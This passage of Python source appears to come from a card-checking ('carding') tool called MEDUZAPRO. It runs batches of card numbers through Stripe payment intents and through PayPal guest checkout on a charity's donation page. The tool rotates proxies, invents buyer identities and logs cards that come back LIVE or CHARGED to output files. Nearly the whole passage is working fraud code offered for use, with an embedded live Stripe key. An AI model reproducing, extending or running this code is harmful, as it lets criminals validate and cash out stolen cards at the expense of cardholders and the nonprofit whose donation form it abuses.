'pk_live_51PviipP5CxCYcgVka4fciOBl5qPudpoFDPgcjli8BzG5g1sYx6YccM13swt5BTO1WEmAcZMnCLgcMuHbJR4Z4d9c00cE9U0riA', '_stripe_version': '2020-08-27', 'client_attribution_metadata[client_session_id]': 'e9f1524f-316f-4a35-b5fb-6219ea09e0fa', 'client_attribution_metadata[merchant_integration_source]': 'elements', 'client_attribution_metadata[merchant_integration_subtype]': 'card-element', 'client_attribution_metadata[merchant_integration_version]': '2017', 'client_attribution_metadata[wallet_config_id]': 'b38d93f8-2c55-4da0-aee3-9b28790c8570', 'client_secret': clientSecret}
            response = ses.post(f'https://api.stripe.com/v1/payment_intents/{paymentId}/confirm', headers=headers, data=post_data)
            result = response.text
            if 'card_error' in result:
                decCode = gstr(result, 'decline_code": "', '"') or gstr(result, '"code": "', '"')
                message = gstr(result, 'message": "', '"')
                if decCode in {'invalid_cvc', 'incorrect_cvc'}:
                    log_line(f'    {LGREEN}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LGREEN}LIVE {LWHITE}--> {LGREEN}{message}{RESET_ALL}')
                    with open('livecc_stripe5.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> INCORRECT_CVC\n')
                        f.flush()
                    return True
                elif decCode in {'insufficient_funds', 'insufficient_fund'}:
                    log_line(f'    {LGREEN}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LGREEN}LIVE {LWHITE}--> {LGREEN}{message}{RESET_ALL}')
                    with open('livecc_stripe5.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> INSUFFICIENT_FUND\n')
                        f.flush()
                    return True
                else:
                    log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}{decCode.upper()} {LWHITE}--> {LRED}{message}{RESET_ALL}')
                    return False
            else:
                statuss = gstr(result, '"status": "', '"')
                if statuss in {'requires_action', 'requires_payment_method'}:
                    log_line(f'    {YELLOW}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {YELLOW}3DS {LWHITE}--> {YELLOW}Card need 3Ds action.{RESET_ALL}')
                    return False
                elif statuss == 'succeeded':
                    log_line(f'    {LGREEN}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LGREEN}CHARGED {LWHITE}--> {LGREEN}{statuss}{RESET_ALL}')
                    with open('livecc_stripe5.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> SUCCEEDED\n')
                        f.flush()
                    return True
        except ProxyError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except SSLError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ConnectionError, Timeout, socket.timeout) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except HTTPError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except TooManyRedirects as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ChunkedEncodingError, ContentDecodingError) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (InvalidURL, InvalidSchema) as e:
            log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}ERROR {LWHITE}--> {LMAGENTA}Invalid request URL.{RESET_ALL}')
            return None
        except RequestException as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        finally:
            ses.close()

def ppl10(card: str, proxy: Optional[str]=None) -> Optional[bool]:
    sr = requests.Session()
    _proxy_manager.apply_to_session(sr)
    fake = Faker('en_CA')
    result = str(random.randint(1, 9)) + chr(random.randint(65, 90)) + chr(random.randint(65, 90)) + str(random.randint(10 ** 13, 10 ** 14 - 1))
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join((secrets.choice(chars) for _ in range(12)))
    useragents = random.choice(USA)
    current_proxy = _proxy_manager.get_current_proxy()
    fingerprintId = __import__('hashlib').sha256(f"{useragents}|{current_proxy or ''}".encode()).hexdigest()
    firstname = fake.first_name()
    lastname = fake.last_name()
    street = fake.street_address()
    city = fake.city()
    state = fake.province_abbr()
    postcode = fake.postalcode()
    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'proton.me', 'protonmail.com', 'live.com', 'msn.com', 'yahoo.co.id', 'yahoo.co.uk'])}"
    today = datetime.now().strftime('%Y-%m-%d')
    today1 = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    for attempt in range(5):
        cc, mm, yy, cvv = card.split('|')
        mm = mm.zfill(2)
        yy = yy[-2:].zfill(2)
        cvv = cvv[:4]
        try:
            headers = {'User-Agent': useragents, 'Cache-Control': 'max-age=0', 'Accept': '*/*'}
            response = sr.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', headers=headers)
            txt = response.text
            brands = gstr(txt, '"brand":"', '"')
            brands = brands.upper() if brands else brands
            brand_map = {'MASTERCARD': 'MASTER_CARD', 'AMERICAN EXPRESS': 'AMEX'}
            brands = brand_map.get(brands, brands)
            headers = {'Host': 'lounsburyhouse.org', 'Cache-Control': 'max-age=0', 'User-Agent': useragents, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Dest': 'document', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'Priority': 'u=0, i'}
            response = sr.get('https://lounsburyhouse.org/donate/', headers=headers)
            resp = response.text
            nonceSub = gstr(resp, '"create_subscription":"', '"')
            paypalToken = gstr(resp, 'text/javascript" data-namespace="wpforms_paypal_single" data-client-token="', '"')
            headers = {'Host': 'lounsburyhouse.org', 'User-Agent': useragents, 'Accept': '*/*', 'Origin': 'https://lounsburyhouse.org', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://lounsburyhouse.org/donate/', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'Priority': 'u=1, i'}
            params = {'action': 'wpforms_paypal_commerce_create_subscription'}
            payload = {'wpforms[fields][4]': (None, ''), 'wpforms[fields][6]': (None, ''), 'wpforms[fields][1][first]': (None, firstname), 'wpforms[fields][1][last]': (None, lastname), 'wpforms[fields][3]': (None, email), 'wpforms[fields][2]': (None, '10.00'), 'wpforms[fields][5]': (None, ''), 'wpforms[fields][11][orderID]': (None, ''), 'wpforms[fields][11][subscriptionID]': (None, ''), 'wpforms[fields][11][source]': (None, ''), 'wpforms[fields][11][cardname]': (None, ''), 'wpforms[recaptcha]': (None, ''), 'wpforms[id]': (None, '464'), 'page_title': (None, 'DONATE'), 'page_url': (None, 'https://lounsburyhouse.org/donate/'), 'url_referer': (None, ''), 'page_id': (None, '332'), 'wpforms[post_id]': (None, '332'), 'total': (None, '10'), 'planId': (None, ''), 'nonce': (None, nonceSub)}
            response = sr.post('https://lounsburyhouse.org/wp-admin/admin-ajax.php', params=params, headers=headers, files=payload)
            resp = response.text
            idTokenCart = gstr(resp, '"id":"', '"')
            headers = {'Host': 'www.paypal.com', 'User-Agent': useragents, 'Accept': 'application/json', 'X-Requested-By': 'smart-payment-buttons', 'Origin': 'https://www.paypal.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Storage-Access': 'active', 'Referer': 'https://www.paypal.com/', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'Priority': 'u=1, i'}
            response = sr.post(f'https://www.paypal.com/smart/api/billagmt/subscriptions/{idTokenCart}/cartid', headers=headers)
            resp = response.text
            TokenCheckout = gstr(resp, '"token":"', '"')
            headers = {'Host': 'www.paypal.com', 'Sec-Ch-Ua-Bitness': '"64"', 'Sec-Ch-Ua-Model': '""', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Wow64': '?0', 'Sec-Ch-Ua-Arch': '"x86"', 'Sec-Ch-Ua-Full-Version': '"146.0.7680.178"', 'Accept': '*/*', 'Content-Type': 'application/json', 'X-Locale': 'en_US', 'Paypal-Client-Context': TokenCheckout, 'X-App-Name': 'checkoutuinodeweb_weasley', 'Paypal-Client-Metadata-Id': 'uid_4b05a89a5f_mtu6mze6mzg', 'User-Agent': useragents, 'X-Country': 'US', 'Sec-Ch-Ua-Platform-Version': '"19.0.0"', 'Origin': 'https://www.paypal.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.paypal.com/checkoutweb/signup?atomic-event-state=eyJkb21haW4iOiJzZGtfcGF5cGFsX3Y1IiwiZXZlbnRzIjpbXSwiaW50ZW50IjoiY2xpY2tfcGF5bWVudF9idXR0b24iLCJpbnRlbnRUeXBlIjoiY2xpY2siLCJpbnRlcmFjdGlvblN0YXJ0VGltZSI6NjcwMjAuNjk5OTk5OTg4MDgsInRpbWVTdGFtcCI6NjcwMjEsInRpbWVPcmlnaW4iOjE3NzUwNTc2MzcxMzguNSwidGFzayI6InNlbGVjdF9vbmVfdGltZV9jaGVja291dCIsImZsb3ciOiJvbmUtdGltZS1jaGVja291dCIsInVpU3RhdGUiOiJ3YWl0aW5nIiwicGF0aCI6Ii9zbWFydC9idXR0b25zIiwidmlld05hbWUiOiJwYXlwYWwtc2RrIn0%3D&sessionID=uid_4b05a89a5f_mtu6mze6mzg&buttonSessionID=uid_8c205ecb2c_mtu6mzm6nty&stickinessID=uid_a751875643_mtu6mze6nda&smokeHash=&sign_out_user=false&fundingSource=paypal&buyerCountry=ID&locale.x=en_US&commit=true&client-metadata-id=uid_4b05a89a5f_mtu6mze6mzg&token=4LN690034X358493T&clientID=BAAwSO84kIJi1j8T7N-vbHg2Pc50EcLuSRZxE2PyB0tVWjIQv1MqltvfNYQj2pt8jZTmRKjMYixtjxKYlA&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QkFBd1NPODRrSUppMWo4VDdOLXZiSGcyUGM1MEVjTHVTUlp4RTJQeUIwdFZXaklRdjFNcWx0dmZOWVFqMnB0OGpaVG1SS2pNWWl4dGp4S1lsQSZjdXJyZW5jeT1VU0QmbG9jYWxlPWVuX1VTJmRpc2FibGUtZnVuZGluZz1jcmVkaXQlMkNwYXlsYXRlciUyQ2JhbmNvbnRhY3QlMkNibGlrJTJDZXBzJTJDZ2lyb3BheSUyQ2lkZWFsJTJDbWVyY2Fkb3BhZ28lMkNteWJhbmslMkNwMjQlMkNzZXBhJTJDc29mb3J0JTJDdmVubW8lMkNhcHBsZXBheSZ2YXVsdD10cnVlJmludGVudD1zdWJzY3JpcHRpb24mY29tcG9uZW50cz1idXR0b25zLGhvc3RlZC1maWVsZHMiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJBd2Vzb21lTW90aXZlX1NQX1BQQ1AiLCJkYXRhLXVpZCI6InVpZF95Z3lxY3hqZHhkZmxoZHJ6cmpoemxweGtvc2FuZHUifX0&country.x=ID&xcomponent=1&integration_artifact=PAYPAL_JS_SDK&version=5.0.536&hasShippingCallback=false&ssrt=1775057709400&rcache=1&useraction=CONTINUE&cookieVariant=hidden&locale.x=en_ID&country.x=ID', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'Priority': 'u=1, i'}
            json_data = {'operationName': 'OnboardGuestMutation', 'variables': {'card': {'cardNumber': str(cc), 'expirationDate': f'{mm}/20{yy}', 'securityCode': str(cvv), 'type': str(brands)}, 'country': 'US', 'email': str(email), 'firstName': str(firstname), 'lastName': str(lastname), 'phone': {'countryCode': '1', 'number': '5159662869', 'type': 'MOBILE'}, 'supportedThreeDsExperiences': ['IFRAME'], 'token': str(TokenCheckout), 'billingAddress': {'line1': '8872 SE Vandalia Dr', 'city': 'Runnells', 'state': 'IA', 'postalCode': '50237', 'accountQuality': {'autoCompleteType': 'MANUAL', 'isUserModified': True, 'twoFactorPhoneVerificationId': ''}, 'country': 'US', 'familyName': str(firstname), 'givenName': str(lastname)}, 'shippingAddress': {'line1': '', 'city': '', 'state': '', 'postalCode': '', 'accountQuality': {'autoCompleteType': 'MANUAL', 'isUserModified': False}, 'country': 'US', 'familyName': str(firstname), 'givenName': str(lastname)}, 'crsData': None}, 'query': 'mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String!, $lastName: String!, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $supportedThreeDsExperiences: [ThreeDSPaymentExperience], $token: String!) {\n  onboardAccount: onboardGuest(\n    bank: $bank\n    billingAddress: $billingAddress\n    card: $card\n    country: $country\n    currencyConversionType: $currencyConversionType\n    dateOfBirth: $dateOfBirth\n    email: $email\n    firstName: $firstName\n    lastName: $lastName\n    phone: $phone\n    shareAddressWithDonatee: $shareAddressWithDonatee\n    shippingAddress: $shippingAddress\n    token: $token\n  ) {\n    buyer {\n      auth {\n        accessToken\n        __typename\n      }\n      userId\n      __typename\n    }\n    flags {\n      is3DSecureRequired\n      __typename\n    }\n    ...fundingOptions\n    paymentContingencies {\n      threeDomainSecure(experiences: $supportedThreeDsExperiences) {\n        status\n        redirectUrl {\n          href\n          __typename\n        }\n        method\n        parameter\n        experience\n        requestParams {\n          key\n          value\n          __typename\n        }\n        __typename\n      }\n      ...threeDSContingencyData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment fundingOptions on CheckoutSession {\n  fundingOptions {\n    allPlans {\n      fundingSources {\n        fundingInstrument {\n          id\n          __typename\n        }\n        amount {\n          currencyCode\n          currencyValue\n          __typename\n        }\n        __typename\n      }\n      fundingContingencies {\n        ... on OpenBankingContingency {\n          encryptedId\n          contingencyReasons\n          contingencyType\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    fundingInstrument {\n      id\n      lastDigits\n      name\n      nameDescription\n      type\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment threeDSContingencyData on PaymentContingencies {\n  threeDSContingencyData {\n    name\n    causeName\n    resolution {\n      type\n      resolutionName\n      paymentCard {\n        billingAddress {\n          line1\n          line2\n          city\n          state\n          country\n          postalCode\n          __typename\n        }\n        expireYear\n        expireMonth\n        currencyCode\n        cardProductClass\n        id\n        encryptedNumber\n        type\n        number\n        bankIdentificationNumber\n        __typename\n      }\n      contingencyContext {\n        deviceDataCollectionUrl {\n          href\n          __typename\n        }\n        jwtSpecification {\n          jwtDuration\n          jwtIssuer\n          jwtOrgUnitId\n          type\n          __typename\n        }\n        authenticationProvider\n        cardBrandProcessed\n        reason\n        referenceId\n        source\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n'}
            response = sr.post('https://www.paypal.com/graphql?OnboardGuestMutation', headers=headers, json=json_data)
            resp = response.text
            messager = gstr(resp, '"message":"', '"')
            if messager == 'ISSUER_DECLINE':
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}ISSUER_DECLINE{RESET_ALL}')
                return False
            if 'INVALID_SECURITY_CODE' in resp:
                log_line(f'    {LWHITE}[{LGREEN}+{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LGREEN}LIVE{LWHITE}: {LGREEN}INVALID_SECURITY_CODE.{RESET_ALL}')
                with open('livecc_paypal.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> INVALID_SECURITY_CODE\n')
                    f.flush()
                return True
            if 'CARD_GENERIC_ERROR' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}CARD_GENERIC_ERROR{RESET_ALL}')
                return False
            if 'GUEST_CARD_COUNTRY_MISMATCH' in resp:
                log_line(f'    {LWHITE}[{LGREEN}+{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LGREEN}LIVE{LWHITE}: {LGREEN}GUEST_CARD_COUNTRY_MISMATCH{RESET_ALL}')
                with open('livecc_paypal.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> GUEST_CARD_COUNTRY_MISMATCH\n')
                    f.flush()
                return True
            if 'CREATE_CARD_ACCOUNT_CANDIDATE_VALIDATION_ERROR' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}CREATE_CARD_ACCOUNT_CANDIDATE_VALIDATION_ERROR{RESET_ALL}')
                return False
            if 'TOKEN_UNDEFINED' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}TOKEN_UNDEFINED{RESET_ALL}')
                return False
            if 'RISK_DISALLOWED' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}RISK_DISALLOWED{RESET_ALL}')
                return False
            if 'DO_NOT_HONOR' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}DO_NOT_HONOR{RESET_ALL}')
                return False
            if 'ACCOUNT_CLOSED' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}ACCOUNT_CLOSED{RESET_ALL}')
                return False
            if 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}PAYER_ACCOUNT_LOCKED_OR_CLOSED{RESET_ALL}')
                return False
            if 'LOST_OR_STOLEN' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}LOST_OR_STOLEN{RESET_ALL}')
                return False
            if 'SUSPECTED_FRAUD' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}SUSPECTED_FRAUD{RESET_ALL}')
                return False
            if 'INVALID_ACCOUNT' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}INVALID_ACCOUNT{RESET_ALL}')
                return False
            if 'REATTEMPT_NOT_PERMITTED' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}REATTEMPT_NOT_PERMITTED{RESET_ALL}')
                return False
            if 'ACCOUNT_BLOCKED_BY_ISSUER' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}ACCOUNT_BLOCKED_BY_ISSUER{RESET_ALL}')
                return False
            if 'INVALID_BILLING_ADDRESS' in resp:
                log_line(f'    {LWHITE}[{LGREEN}+{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LGREEN}LIVE{LWHITE}: {LGREEN}INVALID_BILLING_ADDRESS.{RESET_ALL}')
                with open('livecc_paypal.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> INVALID_BILLING_ADDRESS\n')
                    f.flush()
                return True
            if 'EXISTING_ACCOUNT_RESTRICTED' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}EXISTING_ACCOUNT_RESTRICTED{RESET_ALL}')
                return False
            if 'OAS_VALIDATION_ERROR' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}OAS_VALIDATION_ERROR{RESET_ALL}')
                return False
            if 'OAS_GENERIC_ERROR' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}DECLINED{LWHITE}: {LRED}OAS_GENERIC_ERROR{RESET_ALL}')
                return False
            if 'CVV2_FAILURE' in resp:
                log_line(f'    {LWHITE}[{LGREEN}+{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LGREEN}LIVE{LWHITE}: {LGREEN}CVV2_FAILURE.{RESET_ALL}')
                with open('livecc_paypal.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> CVV2_FAILURE\n')
                    f.flush()
                return True
            if 'INSUFFICIENT_FUNDS' in resp:
                log_line(f'    {LWHITE}[{LRED}!{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LYELLOW}APPROVED{LWHITE}: {LRED}INSUFFICIENT_FUNDS{RESET_ALL}')
                with open('livecc_paypal.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> INSUFFICIENT_FUNDS\n')
                    f.flush()
                return True
            else:
                log_line(f'    {LWHITE}[{LGREEN}+{LWHITE}] {cc}|{mm}|{yy}|{cvv} --> {LGREEN}APPROVED{LWHITE}: {LGREEN}APPROVED_CARD.{RESET_ALL}')
                with open('livecc_paypal.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> APPROVED_CARD\n')
                    f.flush()
                return True
        except ProxyError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except SSLError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ConnectionError, Timeout, socket.timeout) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except HTTPError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except TooManyRedirects as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ChunkedEncodingError, ContentDecodingError) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (InvalidURL, InvalidSchema) as e:
            log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}ERROR {LWHITE}--> {LMAGENTA}Invalid request URL.{RESET_ALL}')
            return None
        except RequestException as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        finally:
            sr.close()
CHECKERS = {'01': ('Stripe auth', flow1, 3), '02': ('Braintree non-VBV', nonvbv, 2), '03': ('Stripe Charge $3', chrgeccn, 3), '04': ('Stripe Charge $1', stripe1xx, 3), '05': ('PayPal Charge $10', ppl10, 4)}

def pretty_error(msg: str):
    print(f'\n     {LRED}[!]{LWHITE} {msg}{RESET_ALL}')

def load_combos(path: str):
    try:
        if not path:
            raise ValueError(f'\n     {LRED}[!]{LWHITE} Path is empty.{RESET_ALL}')
        p = Path(path).expanduser().resolve()
        if not p.is_file():
            raise FileNotFoundError(f'\n     {LRED}[!]{LWHITE} File not found: {p}{RESET_ALL}')
        if p.suffix.lower() != '.txt':
            raise ValueError(f'\n     {LRED}[!]{LWHITE} File must be .txt{RESET_ALL}')
        combos = set()
        with p.open('r', encoding='utf-8', errors='strict') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if ' ' in line and '|' in line:
                    first, rest = line.split(' ', 1)
                    if not first.replace('+', '').isdigit():
                        line = rest.strip()
                parts = [part.strip() for part in line.split('|')]
                if len(parts) < 4:
                    continue
                cc, mm, yy, c2 = parts[:4]
                combos.add(f'{cc}|{mm}|{yy}|{c2}')
        if not combos:
            raise ValueError(f'\n     {LRED}[!]{LWHITE} No valid combos found.{RESET_ALL}')
        return (list(combos), p)
    except UnicodeDecodeError:
        raise ValueError(f'\n     {LRED}[!]{LWHITE} File must be UTF-8 encoded.{RESET_ALL}')
    except Exception as e:
        raise RuntimeError(f'\n     {LRED}[!]{LWHITE} Failed to load combos: {e}{RESET_ALL}')

def worker(combo, flow_func, checker_id, live_path, proxy=None):
    if not isinstance(combo, str):
        return
    try:
        result = flow_func(combo, proxy=proxy)
    except Exception:
        result = None
    with print_lock:
        with lock:
            stats = counters.setdefault(checker_id, {'live': 0, 'declined': 0, 'error': 0})
            if result is True:
                stats['live'] += 1
            elif result is False:
                stats['declined'] += 1
            else:
                stats['error'] += 1
            live = stats['live']
            declined = stats['declined']
            error = stats['error']
        sys.stdout.write('\r\x1b[K')
        print(f'    {LWHITE} - {LGREEN} LIVE {GRAY}- {WHITE}{live:>3}{LWHITE}│ {LRED} DECLINED {GRAY}- {WHITE}{declined:>3}{LWHITE}│ {LMAGENTA} ERROR  {GRAY}- {WHITE}{error:>3}{LWHITE}   - {RESET_ALL}', end='', flush=True)

def run_checker(filename, checker_id, combos, flow_func, max_workers, proxy=None):
    live_path = RESULT_DIR / filename
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for combo in combos:
            futures.append(executor.submit(worker, combo, flow_func, checker_id, live_path, proxy))
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                continue

def handle_checker(checker_id, title, combos, flow_func, max_workers, proxy=None):
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        separator = f"{LWHITE}    {'-' * 66}{RESET_ALL}"
        safe_print(banner)
        live_counter.setdefault(checker_id, 0)
        filename = f"{re.sub('[^a-z0-9]+', '', title.lower())}_live.txt"
        result_path = RESULT_DIR / filename
        total_cards = len(combos)
        print(f'     {LBLUE}[▪]{LWHITE} Load card total : {LBLUE}{total_cards}{RESET_ALL}')
        print(f'     {LBLUE}[▪]{LWHITE} Live file path  : {LBLUE}{result_path}{RESET_ALL}')
        print(separator)
        run_checker(filename=filename, checker_id=checker_id, combos=combos, flow_func=flow_func, max_workers=max_workers, proxy=proxy)
        print()
        print('\r\x1b[K', end='')
        live_found = counters.get(checker_id, {}).get('live', 0)
        print(f'\n  {LCYAN}[▪]{LGREEN} Live found : {live_found}{RESET_ALL}')
        print(f'  {LCYAN}[▪]{LGREEN} Saved to : {result_path}{RESET_ALL}')
        input(f'\n  {LRED}[Press ENTER to return]{RESET_ALL}')
    except Exception as error:
        print(f'\n  {LRED}[!]{LWHITE} Checker failed: {LRED}{error}{RESET_ALL}')
        input(f'\n  {LRED}[Press ENTER to return]{RESET_ALL}')

def set_title(text):
    if os.name == 'nt':
        os.system(f'title {text}')
    else:
        sys.stdout.write(f'\x1b]0;{text}\x07')
        sys.stdout.flush()

def _check_license_auth() -> bool:
    return True

def main():
    while True:
        _check_license_auth()
        _show_main_menu()

def _show_main_menu():
    while True:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            set_title('MEDUZAPRO - 24.1.0')
            safe_print(banner)
            _print_status_bar()
            print(f"  {LCYAN}┌{'─' * 60}┐{RESET_ALL}")
            _print_menu_item(num='01', title='Stripe Auth', desc='Auth Stripe card')
            _print_menu_item(num='02', title='Braintree Non-VBV', desc='Non-VBV card checker')
            _print_menu_item(num='03', title='Stripe Charge $3', desc='Stripe Charge $3 3D')
            _print_menu_item(num='04', title='Stripe Charge $5', desc='Stripe Charge $5 2D')
            _print_menu_item(num='05', title='PayPal Charge $10', desc='PayPal payment checker')
            _print_menu_item(num='06', title='Settings', desc='Proxy, license, update')
            _print_menu_item(num='00', title='Exit', desc='', active=False)
            print(f"  {LCYAN}└{'─' * 60}┘{RESET_ALL}")
            print()
            choice = input(f'  {LCYAN}›{RESET_ALL} Select option > ').strip()
            if not choice or not choice.isdigit():
                print(f'\n  {LRED}✗{RESET_ALL} Invalid input')
                time.sleep(1)
                continue
            choice = choice.zfill(2)
            if choice == '00' or choice == '0':
                should_exit = True
                break
            if choice == '06' or choice == '6':
                show_settings()
                continue
            if choice not in CHECKERS:
                print(f'\n  {LRED}✗{RESET_ALL} Option not available')
                time.sleep(1)
                continue
            title, flow_func, workers = CHECKERS[choice]
            slug = re.sub('[^a-z0-9]+', '', title.lower())
            path = input(f'  {LCYAN}›{RESET_ALL} ({slug.upper()}) CC file > ').strip().strip('"').strip("'")
            try:
                combos, _ = load_combos(path)
            except Exception as error:
                pretty_error(str(error))
                time.sleep(random.uniform(4, 20))
                continue
            title, flow_func, workers = CHECKERS[choice]
            try:
                handle_checker(checker_id=choice, title=title, combos=combos, flow_func=flow_func, max_workers=workers)
            except KeyboardInterrupt:
                break
            except Exception as error:
                print(f'\n  {LRED}✗{RESET_ALL} Error: {error}')
                input(f'\n  {LBLACK}[Press ENTER]{RESET_ALL}')
        except KeyboardInterrupt:
            break
        except Exception as error:
